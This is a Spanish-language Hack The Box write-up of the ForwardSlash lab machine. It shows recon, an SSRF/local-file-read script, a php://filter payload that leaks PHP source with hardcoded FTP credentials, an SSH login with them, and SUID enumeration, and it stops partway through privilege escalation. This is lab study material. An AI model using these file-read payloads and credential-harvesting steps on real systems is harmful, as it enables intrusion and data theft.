---
title: Hack The Box ForwardSlash
author: k4miyo
date: 2022-01-23
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Hard, Linux]
tags: [XXE, Cryptography, Web]
ping: true
---

## ForwardSlash
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.183.

```bash
❯ ping -c 1 10.10.10.183
PING 10.10.10.183 (10.10.10.183) 56(84) bytes of data.
64 bytes from 10.10.10.183: icmp_seq=1 ttl=63 time=136 ms

--- 10.10.10.183 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 135.862/135.862/135.862/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Linux. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -T5 -v -n 10.10.10.183 -oG allPorts
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 19:01 CST
Initiating Ping Scan at 19:01
Scanning 10.10.10.183 [4 ports]
Completed Ping Scan at 19:01, 0.16s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:01
Scanning 10.10.10.183 [65535 ports]
Discovered open port 22/tcp on 10.10.10.183
Discovered open port 80/tcp on 10.10.10.183
Completed SYN Stealth Scan at 19:01, 36.51s elapsed (65535 total ports)
Nmap scan report for 10.10.10.183
Host is up (0.14s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 36.84 seconds
           Raw packets sent: 67701 (2.979MB) | Rcvd: 67698 (2.708MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.183
   5   │     [*] Open ports: 22,80
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p22,80 10.10.10.183 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-16 19:03 CST
Nmap scan report for 10.10.10.183
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 3c:3b:eb:54:96:81:1d:da:d7:96:c7:0f:b4:7e:e1:cf (RSA)
|   256 f6:b3:5f:a2:59:e3:1e:57:35:36:c3:fe:5e:3d:1f:66 (ECDSA)
|_  256 1b:de:b8:07:35:e8:18:2c:19:d8:cc:dd:77:9c:f2:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Did not follow redirect to http://forwardslash.htb
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds
```

Vemos la respuesta del lado del servidor y se aplica un redirect hacia el dominio `forwardslash.htb`; por lo tanto, vamos a agregar el dominio a nuestro archivo `/etc/hosts` y despúes vamos a correr la herramienta `whatweb` para ver a lo que nos enfrentamos.

```bash
❯ whatweb http://10.10.10.183
http://10.10.10.183 [302 Found] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.183], RedirectLocation[http://forwardslash.htb]
http://forwardslash.htb [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.183], Title[Backslash Gang]
❯ whatweb http://forwardslash.htb/
http://forwardslash.htb/ [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.183], Title[Backslash Gang]
```

No vemos nada interesante, así que vamos a echarle un ojo vía web.

![""](/assets/images/htb-forwardslash/forwardslash-web.png)

Se trata de un ***defacement*** en el cual nos dan unas posibles pistas; pero fuera de eso, no vemos nada interesante, así que vamos a tratar de descubrir nuevos recursos dentro del servidor empezando por `nmap` y luego herramientas mas tochas.

```bash
❯ nmap --script http-enum -p80 10.10.10.183
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-22 19:08 CST
Nmap scan report for forwardslash.htb (10.10.10.183)
Host is up (0.15s latency).

PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.61 seconds
```

No obtenemos información, así que vamos con `wfuzz` y tratar de descubrir subdominios.

```bash
❯ wfuzz -c -L --hc=404 --hh=422 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -H "Host: FUZZ.forwardslash.htb" http://forwardslash.htb/
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://forwardslash.htb/
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000001626:   200        39 L     99 W       1267 Ch     "backup"                                                        
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 122
Filtered Requests: 121
Requests/sec.: 0
```

Tenemos un subdominios que es `backup.forwardslash.htb`, así que vamos a agregarlo a nuestro archivo `/etc/hosts` y a echarle un ojo a ver que tiene.

![""](/assets/images/htb-forwardslash/forwardslash-web1.png)

Tenemos un panel de login y además podría contar con un panel de registro; asi que antes de intentar cualquier cosa, vamos a tratar de registrarnos y ver a lo que tenemos acceso.

![""](/assets/images/htb-forwardslash/forwardslash-web2.png)

Aquí algo que ya nos debería llamar la atención sería **Change Your Profile Picture**, a que nos permitiría subir archivos.

![""](/assets/images/htb-forwardslash/forwardslash-web3.png)

Al ingresar vemos que nos dice que se ha deshabilitado los items, pero igual y podríamos habilitarlos para despúes hacer una consulta; esto lo logramos dando click secundario en el sitio web y seleccionar la opción de **Inspeccionar**, ahí nos muestra el código fuente del sitio y sobre los campos **input** damos click secundario y elegimos **Editar como HTML** y eliminamos la parte donde dice **disabled=""**.

![""](/assets/images/htb-forwardslash/forwardslash-web4.png)

Con esto se nos habilitan dichos campos y si escribimos cualquier cosa en donde dice **URL** y luego damos click en **Submit**, vemos que la petición se tramita; por lo tanto, vamos a ver si puede acceder a un recurso de nuestra máquina, por lo que nos compartimos un servicio HTTP con python:

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.183 - - [22/Jan/2022 19:39:12] "GET /test.php HTTP/1.0" 200 -
```

![""](/assets/images/htb-forwardslash/forwardslash-web5.png)

Vemos que la consulta se realiza, ahora vamos a ver si podemos ver archivos internos de la máquina, como el `/etc/passwd`:

![""](/assets/images/htb-forwardslash/forwardslash-web6.png)

También podemos ver recursos internos de la máquina. Como es un poco incómodo andar cambiando varias veces el item **input** quitando el disable, vamos a crearnos un programa en python.

```python
#!/usr/bin/python3
#coding: utf'8

import signal, requests, time, sys, re

def def_handler(sig, frame):
    print("\n[!] Saliendo...")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

url_login = "http://backup.forwardslash.htb/login.php"
url_picture = "http://backup.forwardslash.htb/profilepicture.php"

def makeRequest():
    data_login = {
        'username' : 'k4miyo',
        'password' : 'k4miyo123'
    }
    s = requests.Session()
    r = s.post(url_login, data=data_login)

    while True:
        filename = input("URL: ")
        data_picture = {
            'url' : '%s' % filename.rstrip('\n')
        }
        r = s.post(url_picture, data=data_picture)
        result = re.findall(r'</html>.*',r.text, flags=re.S)[0].replace('</html>', '')
        print(result)

if __name__ == '__main__':
    makeRequest()
```

```bash
❯ python3 shell.py                                              
URL: /etc/hosts                                                 
                                                                                                                                 
127.0.0.1 localhost                                             
127.0.1.1 forwardslash backup.forwardslash.htb forwardslash.htb                                                                  
                                                                                                                                 
                                                                
# The following lines are desirable for IPv6 capable hosts      
::1     ip6-localhost ip6-loopback                              
fe00::0 ip6-localnet                                            
ff00::0 ip6-mcastprefix                                         
ff02::1 ip6-allnodes                                            
ff02::2 ip6-allrouters                                          
                                                                
URL:
```

Ya con la utilidad podemos ver los contenidos de archivos de una manera más cómoda. Vamos a probar algunos archivos interesantes:

```bash
❯ python3 shell.py
URL: http://10.10.14.27/test.php

<?php
        echo "Hola mundo!";
?>

URL: /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
pain:x:1000:1000:pain:/home/pain:/bin/bash
chiv:x:1001:1001:Chivato,,,:/home/chiv:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false

URL: /proc/net/tcp

  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 3500007F:0035 00000000:0000 0A 00000000:00000000 00:00000000 00000000   101        0 23510 1 0000000000000000 100 0 0 10 0                     
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 25960 1 0000000000000000 100 0 0 10 0                     
   2: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   111        0 26426 1 0000000000000000 100 0 0 10 0                     
   3: 0100007F:D3D6 0101007F:0050 01 00000000:00000000 00:00000000 00000000    33        0 40648 2 0000000000000000 20 0 0 10 -1                     
   4: B70A0A0A:B0B6 01010101:0035 02 00000001:00000000 01:00000296 00000003   101        0 40646 2 0000000000000000 800 0 0 1 7                      

URL: /proc/sched_debug                                                                                                           
                                                                                                                                 Sched Debug Version: v0.11, 4.15.0-91-generic #92-Ubuntu                                                                         
ktime                                   : 6288733.538397                                                                         sched_clk                               : 6289009.681041                                                                         
cpu_clk                                 : 6288716.334719                                                                         jiffies                                 : 4296464479                                                                             
sched_clock_stable()                    : 1                                                                                                                                                                                                                       
sysctl_sched                                                                                                                       .sysctl_sched_latency                    : 12.000000                                                                           
  .sysctl_sched_min_granularity            : 1.500000                                                                              .sysctl_sched_wakeup_granularity         : 2.000000                                                                            
  .sysctl_sched_child_runs_first           : 0                                                                                     .sysctl_sched_features                   : 2021179                                                                             
  .sysctl_sched_tunable_scaling            : 1 (logaritmic)

...

 I kworker/u256:2  2036     33445.014821      6225   120         0.000000       312.580155         0.000000 0 0 /
 I kworker/u256:0  2122     33449.984484      1848   120         0.000000        96.526395         0.000000 0 0 /
 I    kworker/1:2  2123     32793.937781         8   120         0.000000         0.202239         0.000000 0 0 /


URL:
```

Podemos acceder a recursos de la máquina atacante, pero no se nos interpreta, así que también podriamos tratar de utilizar wrappers:

```bash
URL: file:///etc/hosts

127.0.0.1 localhost
127.0.1.1 forwardslash backup.forwardslash.htb forwardslash.htb


# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

URL: expect://whoami


URL: 
```

No obtenemos algo que nos ayude a ingresar a la máquina víctima, asi que lo que podriamos hacer es tratar de buscar directorios y/o recursos bajo `backup.forwardslash.htb/`:

```bash
❯ wfuzz -c --hc=404 --hh=33 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://backup.forwardslash.htb/FUZZ
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://backup.forwardslash.htb/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                         
=====================================================================

000000834:   301        9 L      28 W       332 Ch      "dev"                                                           
^C000000977:   404        9 L      31 W       285 Ch      "announce"                                                      

Total time: 17.73565
Processed Requests: 976
Filtered Requests: 975
Requests/sec.: 55.03040
```

Tenemos el directorio `dev`, vamos a echarle un ojito.

![""](/assets/images/htb-forwardslash/forwardslash-web7.png)

Vemos una respuesta algo personalizadas, por lo que podría pensar que debemos estar apuntando a un recurso por defecto como **index.php**.

![""](/assets/images/htb-forwardslash/forwardslash-web8.png)

Y es correcto, entonces podríamos tratar de ver el contenido de dicho archivo con nuestro programa en python que desarrollamos y vamos a suponer que la ruta interna de dicho archivo está en `/var/www/backup.forwardslash.htb/dev/index.php` y además, como es un archivo php, lo más seguro es que el servidor lo interprete, así que haremos uso de un wrapper para convertirlo en base64:

```bash
❯ rlwrap python3 shell.py
php://filter/convert.base64-encode/resource=/var/www/backup.forwardslash.htb/dev/index.php

PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3NldCgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpICYmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT40MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAgICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29udGVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3JtIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0iMjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvcm0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1xkP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRjaCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmdHBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZygkY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VUWyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhcGkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIiRyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGlmIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJlYW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K
URL:
```

Copiamos la cadena y la desciframos en nuestra máquina:

```bash
❯ echo "PD9waHAKLy9pbmNsdWRlX29uY2UgLi4vc2Vzc2lvbi5waHA7Ci8vIEluaXRpYWxpemUgdGhlIHNlc3Npb24Kc2Vzc2lvbl9zdGFydCgpOwoKaWYoKCFpc3Nld
CgkX1NFU1NJT05bImxvZ2dlZGluIl0pIHx8ICRfU0VTU0lPTlsibG9nZ2VkaW4iXSAhPT0gdHJ1ZSB8fCAkX1NFU1NJT05bJ3VzZXJuYW1lJ10gIT09ICJhZG1pbiIpIC
YmICRfU0VSVkVSWydSRU1PVEVfQUREUiddICE9PSAiMTI3LjAuMC4xIil7CiAgICBoZWFkZXIoJ0hUVFAvMS4wIDQwMyBGb3JiaWRkZW4nKTsKICAgIGVjaG8gIjxoMT4
0MDMgQWNjZXNzIERlbmllZDwvaDE+IjsKICAgIGVjaG8gIjxoMz5BY2Nlc3MgRGVuaWVkIEZyb20gIiwgJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10sICI8L2gzPiI7CiAg
ICAvL2VjaG8gIjxoMj5SZWRpcmVjdGluZyB0byBsb2dpbiBpbiAzIHNlY29uZHM8L2gyPiIKICAgIC8vZWNobyAnPG1ldGEgaHR0cC1lcXVpdj0icmVmcmVzaCIgY29ud
GVudD0iMzt1cmw9Li4vbG9naW4ucGhwIiAvPic7CiAgICAvL2hlYWRlcigibG9jYXRpb246IC4uL2xvZ2luLnBocCIpOwogICAgZXhpdDsKfQo/Pgo8aHRtbD4KCTxoMT
5YTUwgQXBpIFRlc3Q8L2gxPgoJPGgzPlRoaXMgaXMgb3VyIGFwaSB0ZXN0IGZvciB3aGVuIG91ciBuZXcgd2Vic2l0ZSBnZXRzIHJlZnVyYmlzaGVkPC9oMz4KCTxmb3J
tIGFjdGlvbj0iL2Rldi9pbmRleC5waHAiIG1ldGhvZD0iZ2V0IiBpZD0ieG1sdGVzdCI+CgkJPHRleHRhcmVhIG5hbWU9InhtbCIgZm9ybT0ieG1sdGVzdCIgcm93cz0i
MjAiIGNvbHM9IjUwIj48YXBpPgogICAgPHJlcXVlc3Q+dGVzdDwvcmVxdWVzdD4KPC9hcGk+CjwvdGV4dGFyZWE+CgkJPGlucHV0IHR5cGU9InN1Ym1pdCI+Cgk8L2Zvc
m0+Cgo8L2h0bWw+Cgo8IS0tIFRPRE86CkZpeCBGVFAgTG9naW4KLS0+Cgo8P3BocAppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICJHRVQiICYmIGlzc2
V0KCRfR0VUWyd4bWwnXSkpIHsKCgkkcmVnID0gJy9mdHA6XC9cL1tcc1xTXSpcL1wiLyc7CgkvLyRyZWcgPSAnLygoKCgyNVswLTVdKXwoMlswLTRdXGQpfChbMDFdP1x
kP1xkKSkpXC4pezN9KCgoKDI1WzAtNV0pfCgyWzAtNF1cZCl8KFswMV0/XGQ/XGQpKSkpLycKCglpZiAocHJlZ19tYXRjaCgkcmVnLCAkX0dFVFsneG1sJ10sICRtYXRj
aCkpIHsKCQkkaXAgPSBleHBsb2RlKCcvJywgJG1hdGNoWzBdKVsyXTsKCQllY2hvICRpcDsKCQllcnJvcl9sb2coIkNvbm5lY3RpbmciKTsKCgkJJGNvbm5faWQgPSBmd
HBfY29ubmVjdCgkaXApIG9yIGRpZSgiQ291bGRuJ3QgY29ubmVjdCB0byAkaXBcbiIpOwoKCQllcnJvcl9sb2coIkxvZ2dpbmcgaW4iKTsKCgkJaWYgKEBmdHBfbG9naW
4oJGNvbm5faWQsICJjaGl2IiwgJ04wYm9keUwxa2VzQmFjay8nKSkgewoKCQkJZXJyb3JfbG9nKCJHZXR0aW5nIGZpbGUiKTsKCQkJZWNobyBmdHBfZ2V0X3N0cmluZyg
kY29ubl9pZCwgImRlYnVnLnR4dCIpOwoJCX0KCgkJZXhpdDsKCX0KCglsaWJ4bWxfZGlzYWJsZV9lbnRpdHlfbG9hZGVyIChmYWxzZSk7CgkkeG1sZmlsZSA9ICRfR0VU
WyJ4bWwiXTsKCSRkb20gPSBuZXcgRE9NRG9jdW1lbnQoKTsKCSRkb20tPmxvYWRYTUwoJHhtbGZpbGUsIExJQlhNTF9OT0VOVCB8IExJQlhNTF9EVERMT0FEKTsKCSRhc
GkgPSBzaW1wbGV4bWxfaW1wb3J0X2RvbSgkZG9tKTsKCSRyZXEgPSAkYXBpLT5yZXF1ZXN0OwoJZWNobyAiLS0tLS1vdXRwdXQtLS0tLTxicj5cclxuIjsKCWVjaG8gIi
RyZXEiOwp9CgpmdW5jdGlvbiBmdHBfZ2V0X3N0cmluZygkZnRwLCAkZmlsZW5hbWUpIHsKICAgICR0ZW1wID0gZm9wZW4oJ3BocDovL3RlbXAnLCAncisnKTsKICAgIGl
mIChAZnRwX2ZnZXQoJGZ0cCwgJHRlbXAsICRmaWxlbmFtZSwgRlRQX0JJTkFSWSwgMCkpIHsKICAgICAgICByZXdpbmQoJHRlbXApOwogICAgICAgIHJldHVybiBzdHJl
YW1fZ2V0X2NvbnRlbnRzKCR0ZW1wKTsKICAgIH0KICAgIGVsc2UgewogICAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KfQoKPz4K" | base64 -d
<?php
//include_once ../session.php;
// Initialize the session
session_start();

if((!isset($_SESSION["loggedin"]) || $_SESSION["loggedin"] !== true || $_SESSION['username'] !== "admin") && $_SERVER['REMOTE_ADD
R'] !== "127.0.0.1"){
    header('HTTP/1.0 403 Forbidden');
    echo "<h1>403 Access Denied</h1>";
    echo "<h3>Access Denied From ", $_SERVER['REMOTE_ADDR'], "</h3>";
    //echo "<h2>Redirecting to login in 3 seconds</h2>"
    //echo '<meta http-equiv="refresh" content="3;url=../login.php" />';
    //header("location: ../login.php");
    exit;
}
?>
<html>                                                                                                                           
        <h1>XML Api Test</h1>                                                                                                    
        <h3>This is our api test for when our new website gets refurbished</h3>                                                  
        <form action="/dev/index.php" method="get" id="xmltest">                                                                 
                <textarea name="xml" form="xmltest" rows="20" cols="50"><api>                                                    
    <request>test</request>                                                                                                      
</api>                                                                                                                           
</textarea>                                                                                                                      
                <input type="submit">                                                                                            
        </form>                                                                                                                  
                                                                                                                                 
</html>                                                                                                                          
                                                                                                                                 
<!-- TODO:                                                                                                                       
Fix FTP Login                                                                                                                    
-->                                                                                                                              

<?php
if ($_SERVER['REQUEST_METHOD'] === "GET" && isset($_GET['xml'])) {

        $reg = '/ftp:\/\/[\s\S]*\/\"/';
        //$reg = '/((((25[0-5])|(2[0-4]\d)|([01]?\d?\d)))\.){3}((((25[0-5])|(2[0-4]\d)|([01]?\d?\d))))/'

        if (preg_match($reg, $_GET['xml'], $match)) {
                $ip = explode('/', $match[0])[2];
                echo $ip;
                error_log("Connecting");

                $conn_id = ftp_connect($ip) or die("Couldn't connect to $ip\n");

                error_log("Logging in");

                if (@ftp_login($conn_id, "chiv", 'N0bodyL1kesBack/')) {

                        error_log("Getting file");
                        echo ftp_get_string($conn_id, "debug.txt");
                }

                exit;
        }

        libxml_disable_entity_loader (false);
        $xmlfile = $_GET["xml"];
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
        $api = simplexml_import_dom($dom);
        $req = $api->request;
        echo "-----output-----<br>\r\n";
        echo "$req";
}

function ftp_get_string($ftp, $filename) {
    $temp = fopen('php://temp', 'r+');
    if (@ftp_fget($ftp, $temp, $filename, FTP_BINARY, 0)) {
        rewind($temp);
        return stream_get_contents($temp);
    }
    else {
        return false;
    }
}

?>
```

Si ponemos ojo de lince, vemos las credenciales del usuario **chiv**: `chiv : N0bodyL1kesBack/`, por lo que las guardamos como siempre y vamos a tratar de ver si nos conectamos por ssh:

```bash
❯ ssh chiv@10.10.10.183
The authenticity of host '10.10.10.183 (10.10.10.183)' can't be established.
ECDSA key fingerprint is SHA256:7DrtoyB3GmTDLmPm01m7dHeoaPjA7+ixb3GDFhGn0HM.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.183' (ECDSA) to the list of known hosts.
chiv@10.10.10.183's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 23 03:09:26 UTC 2022

  System load:  0.0               Processes:             172
  Usage of /:   53.2% of 7.75GB   Users logged in:       0
  Memory usage: 11%               IP address for ens160: 10.10.10.183
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

15 packages can be updated.
0 updates are security updates.


Last login: Tue Mar 24 11:34:37 2020 from 10.10.14.3
chiv@forwardslash:~$ whoami
chiv
chiv@forwardslash:~$
```

Ya nos encontramos dentro de la máquina, sin embargo no podemos visualizar la flag, es necesario migrar al usuario **pain**; por lo que vamos a enumerar un poco el sistema:

```bash
chiv@forwardslash:~$ id
uid=1001(chiv) gid=1001(chiv) groups=1001(chiv)
chiv@forwardslash:~$ sudo -l
[sudo] password for chiv: 
Sorry, user chiv may not run sudo on forwardslash.
chiv@forwardslash:~$ cd /
chiv@forwardslash:/$ find \-perm -4000 -printf "%f\t%p\t%u\t%g\t%m\n" 2>/dev/null | column -t | grep -v "root"
at                         ./usr/bin/at                                                  daemon  daemon           6755
backup                     ./usr/bin/backup                                              pain    pain             4555
chiv@forwardslash:/$
```

Vemos que tenemos permisos SUID sobre el recurso `/usr/bin/backup` cuyo propietario es el usuario **pain**, al cual necesitamos migrar para visualizar la flag.

```bash
chiv@forwardslash:/$ file /usr/bin/backup                       
